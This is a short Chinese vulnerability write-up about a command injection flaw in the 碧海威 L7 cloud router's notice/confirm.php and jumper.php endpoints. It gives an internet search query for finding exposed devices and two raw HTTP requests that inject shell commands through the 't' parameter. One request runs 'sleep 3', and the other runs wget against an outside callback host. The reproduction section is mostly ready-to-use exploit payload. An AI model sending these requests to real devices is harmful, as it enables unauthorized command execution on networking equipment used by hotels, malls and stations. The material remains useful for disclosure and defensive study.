# 碧海威 L7多款产品confirm存在命令执行漏洞

# 一、漏洞简介
碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品confirm存在命令执行漏洞

# 二、影响版本
+ 碧海威 L7云路由

# 三、资产测绘
```plain
product="碧海威科技-L7云路由"
```

![1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d.png](./img/mHd0RhkHaJqo_UPI/1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d-319239.png)

# 四、漏洞复现
```plain
GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1717873640214-f81c5977-3acf-4091-84f5-157642413565.png](./img/mHd0RhkHaJqo_UPI/1717873640214-f81c5977-3acf-4091-84f5-157642413565-272740.png)

```plain
GET /notice/jumper.php?t=;wget%20tadayzkvfq.dgrh3.cn HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1719303279808-613fbf12-e772-469f-9dfb-1bf1c3d53d44.png](./img/mHd0RhkHaJqo_UPI/1719303279808-613fbf12-e772-469f-9dfb-1bf1c3d53d44-161786.png)



> 更新: 2024-06-27 09:15:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nsgae82bubkkmg4k>